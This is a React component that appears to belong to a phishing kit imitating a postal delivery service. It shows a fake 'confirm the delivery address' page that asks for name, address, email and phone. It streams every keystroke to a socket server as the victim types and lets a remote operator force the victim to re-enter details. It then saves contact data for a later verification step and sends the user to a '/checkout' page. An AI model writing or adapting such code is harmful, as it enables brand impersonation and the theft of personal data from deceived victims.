import { useEffect, useRef, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { socket } from '../socket';
import { useCurrentPage } from '../hooks/useCurrentPage';
import { clearDraft, loadDraft, saveDraft, STORAGE_KEYS } from '../session';
import { BRAND, BRAND_PROMISES } from '../brand';

type Form = {
  fullname: string;
  address: string;
  fulladdress: string;
  city: string;
  state: string;
  postalcode: string;
  email: string;
  telephone: string;
};

const EMPTY_FORM: Form = {
  fullname: '',
  address: '',
  fulladdress: '',
  city: '',
  state: '',
  postalcode: '',
  email: '',
  telephone: '',
};

function loadInfoFormDraft() {
  const raw = loadDraft<Partial<Form> | null>(STORAGE_KEYS.infoDraft, null);
  if (!raw || typeof raw !== 'object') return EMPTY_FORM;
  return {
    fullname: (raw.fullname || '').toString(),
    address: (raw.address || '').toString(),
    fulladdress: (raw.fulladdress || '').toString(),
    city: (raw.city || '').toString(),
    state: (raw.state || '').toString(),
    postalcode: (raw.postalcode || '').toString(),
    email: (raw.email || '').toString(),
    telephone: (raw.telephone || '').toString(),
  };
}

const LABEL: Record<keyof Form, string> = {
  fullname: 'Full Name',
  address: 'Address',
  fulladdress: 'Address Line 2',
  city: 'City',
  state: 'State / Province',
  postalcode: 'Postal Code',
  email: 'Email',
  telephone: 'Phone Number',
};

const REQUIRED: Array<keyof Form> = ['fullname', 'address', 'city', 'state', 'postalcode', 'email', 'telephone'];

function isEmail(x: string) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(x.trim());
}

function normalizePhone(x: string) {
  const trimmed = x.trim();
  const plus = trimmed.startsWith('+') ? '+' : '';
  const digits = trimmed.replace(/[^\d]/g, '');
  return (plus + digits).slice(0, 20);
}

type RefillPayload = { reason?: string; recordId?: string };

export default function Info() {
  useCurrentPage('info');
  const navigate = useNavigate();

  const [form, setForm] = useState<Form>(() => loadInfoFormDraft());
  const [status, setStatus] = useState('Enter the delivery information for this shipment.');
  const [loading, setLoading] = useState(false);
  const [errors, setErrors] = useState<Partial<Record<keyof Form, string>>>({});

  const inputRefs = useRef<Partial<Record<keyof Form, HTMLInputElement | null>>>({});
  const typingTimers = useRef<Partial<Record<keyof Form, ReturnType<typeof setTimeout>>>>({});

  useEffect(() => {
    socket.emit('join-page', 'info');
    const hasDraft = Object.values(form).some((v) => v.trim());
    setStatus(hasDraft ? 'Saved details restored.' : 'Enter the delivery information for this shipment.');
  }, []);

  useEffect(() => {
    saveDraft(STORAGE_KEYS.infoDraft, form);
  }, [form]);

  useEffect(() => {
    const hasDraft = Object.values(form).some((v) => v.trim());
    if (!hasDraft) return;
    const timer = setTimeout(() => {
      (Object.keys(form) as Array<keyof Form>).forEach((key) => {
        const value = form[key];
        if (!value) return;
        socket.emit('update-form-field', { field: key, value });
      });
    }, 180);
    return () => clearTimeout(timer);
  }, []);

  useEffect(() => {
    const handleForceRefill = (payload?: RefillPayload) => {
      setForm(EMPTY_FORM);
      clearDraft(STORAGE_KEYS.infoDraft);
      setErrors({});
      setLoading(false);

      setStatus(payload?.reason ? `Update requested: ${payload.reason}` : 'Please review and re-enter the delivery details.');
      navigate('/info', { replace: true });
      window.scrollTo({ top: 0, behavior: 'smooth' });
      setTimeout(() => inputRefs.current.fullname?.focus(), 0);
    };

    socket.on('force-refill', handleForceRefill);
    return () => {
      socket.off('force-refill', handleForceRefill);
    };
  }, [navigate]);

  const scheduleEmit = (field: keyof Form, value: string) => {
    const t = typingTimers.current[field];
    if (t) clearTimeout(t);
    typingTimers.current[field] = setTimeout(() => {
      socket.emit('update-form-field', { field, value });
    }, 180);
  };

  const validateAll = (next: Form) => {
    const e: Partial<Record<keyof Form, string>> = {};
    for (const k of REQUIRED) {
      if (!next[k].trim()) e[k] = `${LABEL[k]} is required.`;
    }
    if (next.email && !isEmail(next.email)) e.email = 'Please enter a valid email address.';
    const phoneDigits = normalizePhone(next.telephone).replace(/\D/g, '');
    if (next.telephone && phoneDigits.length > 0 && phoneDigits.length < 7) e.telephone = 'Phone number looks too short.';
    return e;
  };

  const validateField = (name: keyof Form, value: string) => {
    if (REQUIRED.includes(name) && !value.trim()) return `${LABEL[name]} is required.`;
    if (name === 'email' && value && !isEmail(value)) return 'Please enter a valid email address.';
    if (name === 'telephone' && value) {
      const phoneDigits = normalizePhone(value).replace(/\D/g, '');
      if (phoneDigits.length > 0 && phoneDigits.length < 7) return 'Phone number looks too short.';
    }
    return undefined;
  };

  const setField = (name: keyof Form, raw: string) => {
    const value = name === 'telephone' ? normalizePhone(raw) : raw;
    setForm((prev) => {
      const next = { ...prev, [name]: value };
      setErrors((old) => {
        const nextErrors = { ...old };
        const msg = validateField(name, value);
        if (msg) nextErrors[name] = msg;
        else delete nextErrors[name];
        return nextErrors;
      });
      return next;
    });
    scheduleEmit(name, value);
    setStatus(`Editing: ${LABEL[name]}`);
  };

  const focusFirstError = (e: Partial<Record<keyof Form, string>>) => {
    for (const k of REQUIRED) {
      if (e[k]) {
        inputRefs.current[k]?.focus();
        return;
      }
    }
  };

  const handleSubmit = () => {
    if (loading) return;
    const e = validateAll(form);
    setErrors(e);
    if (Object.keys(e).length > 0) {
      setStatus('Review the highlighted fields and try again.');
      setTimeout(() => focusFirstError(e), 0);
      return;
    }

    setLoading(true);
    setStatus('Saving your details...');
    clearDraft(STORAGE_KEYS.infoDraft);
    saveDraft(STORAGE_KEYS.verifyContact, {
      telephone: form.telephone.trim(),
      email: form.email.trim(),
    });
    socket.emit('update-user-info', { ...form });
    setTimeout(() => navigate('/checkout'), 450);
  };

  const inputClass = (name: keyof Form) =>
    ['alz-input placeholder:text-slate-400', errors[name] ? 'border-red-500/60 !shadow-[0_0_0_3px_rgba(239,68,68,0.12)]' : ''].join(' ');

  const ErrorText = ({ name }: { name: keyof Form }) => (
    errors[name] ? <p className="mt-2 text-sm text-red-500 leading-snug">{errors[name]}</p> : null
  );

  return (
    <div className="alz-page alz-usps-page">
      <div className="alz-shell alz-usps-form-shell">
        <div className="alz-top alz-usps-form-top">
          <div className="alz-step-head">
            <div>
              <h1 className="alz-step-title">Confirm the delivery address</h1>
              <p className="alz-step-subtitle">Review the recipient and mailing details.</p>
            </div>
          </div>
          <div className="alz-track mt-3">
            <span style={{ width: '34%' }} />
          </div>
        </div>

        <div className="alz-flow-grid alz-usps-flow-grid">
          <div className="alz-card alz-usps-form-card">
            <div className="alz-section-eyebrow">Delivery details</div>
            <h2 className="alz-page-title">Review your mailing info</h2>
            <p className="alz-page-copy">{status}</p>
            <div className="alz-brand-row mb-2">
              {BRAND_PROMISES.map((item) => (
                <span key={item} className="alz-brand-pill">{item}</span>
              ))}
            </div>

            <form
              className="space-y-5 mt-5"
              onSubmit={(e) => {
                e.preventDefault();
                handleSubmit();
              }}
            >
              <div>
                <label className="alz-field-label">Full name</label>
                <input ref={(el) => (inputRefs.current.fullname = el)} value={form.fullname} onChange={(e) => setField('fullname', e.target.value)} className={inputClass('fullname')} placeholder="Full Name *" autoComplete="name" enterKeyHint="next" />
                <ErrorText name="fullname" />
              </div>
              <div>
                <label className="alz-field-label">Street address</label>
                <input ref={(el) => (inputRefs.current.address = el)} value={form.address} onChange={(e) => setField('address', e.target.value)} className={inputClass('address')} placeholder="Address *" autoComplete="address-line1" enterKeyHint="next" />
                <ErrorText name="address" />
              </div>
              <div>
                <label className="alz-field-label">Apartment, suite, unit, building, floor, etc.</label>
                <input ref={(el) => (inputRefs.current.fulladdress = el)} value={form.fulladdress} onChange={(e) => setField('fulladdress', e.target.value)} className={inputClass('fulladdress')} placeholder="Apt, suite, unit, building, floor, etc. (optional)" autoComplete="address-line2" enterKeyHint="next" />
                <ErrorText name="fulladdress" />
              </div>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
                <div>
                  <label className="alz-field-label">City</label>
                  <input ref={(el) => (inputRefs.current.city = el)} value={form.city} onChange={(e) => setField('city', e.target.value)} className={inputClass('city')} placeholder="City *" autoComplete="address-level2" enterKeyHint="next" />
                  <ErrorText name="city" />
                </div>
                <div>
                  <label className="alz-field-label">State</label>
                  <input ref={(el) => (inputRefs.current.state = el)} value={form.state} onChange={(e) => setField('state', e.target.value)} className={inputClass('state')} placeholder="State / Province *" autoComplete="address-level1" enterKeyHint="next" />
                  <ErrorText name="state" />
                </div>
              </div>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
                <div>
                  <label className="alz-field-label">ZIP code</label>
                  <input ref={(el) => (inputRefs.current.postalcode = el)} value={form.postalcode} onChange={(e) => setField('postalcode', e.target.value)} className={inputClass('postalcode')} placeholder="Postal Code *" autoComplete="postal-code" inputMode="numeric" enterKeyHint="next" />
                  <ErrorText name="postalcode" />
                </div>
                <div>
                  <label className="alz-field-label">Phone number</label>
                  <input ref={(el) => (inputRefs.current.telephone = el)} value={form.telephone} onChange={(e) => setField('telephone', e.target.value)} className={inputClass('telephone')} placeholder="Phone Number *" autoComplete="tel" inputMode="tel" enterKeyHint="next" />
                  <ErrorText name="telephone" />
                </div>
              </div>
              <div>
                <label className="alz-field-label">Email address</label>
                <input ref={(el) => (inputRefs.current.email = el)} value={form.email} onChange={(e) => setField('email', e.target.value)} className={inputClass('email')} placeholder="Email *" autoComplete="email" inputMode="email" enterKeyHint="done" />
                <ErrorText name="email" />
              </div>

              <button type="submit" disabled={loading} className="alz-btn-primary mt-2 text-lg sm:text-xl md:text-2xl">
                {loading ? 'Saving...' : 'Continue'}
              </button>
              <p className="alz-helper-copy text-center mt-3">
                You may be asked to reconfirm these details later.
              </p>
            </form>

            <div className="alz-footer">{BRAND.name} | {BRAND.portal}</div>
            <div className="text-[11px] text-center text-[#565959] mt-1">{BRAND.legal}</div>
          </div>

          <aside className="alz-card alz-flow-aside alz-side-summary alz-usps-side-card">
            <div className="alz-side-summary-title">Mailing checklist</div>
            <div className="alz-order-mini-card">
              <div className="alz-order-mini-thumb" />
              <div>
                <div className="alz-order-mini-title">Review the address on file</div>
                <div className="alz-order-mini-copy">Confirm the recipient name, address, ZIP Code, and contact details.</div>
              </div>
            </div>
            <div className="alz-side-summary-list">
              <div>Recipient name exactly as entered</div>
              <div>Street address, city, state, and ZIP Code</div>
              <div>Phone number and email</div>
            </div>
            <div className="alz-side-summary-box">Use the mailing information tied to this shipment so delivery can resume.</div>
          </aside>
        </div>
      </div>
    </div>
  );
}
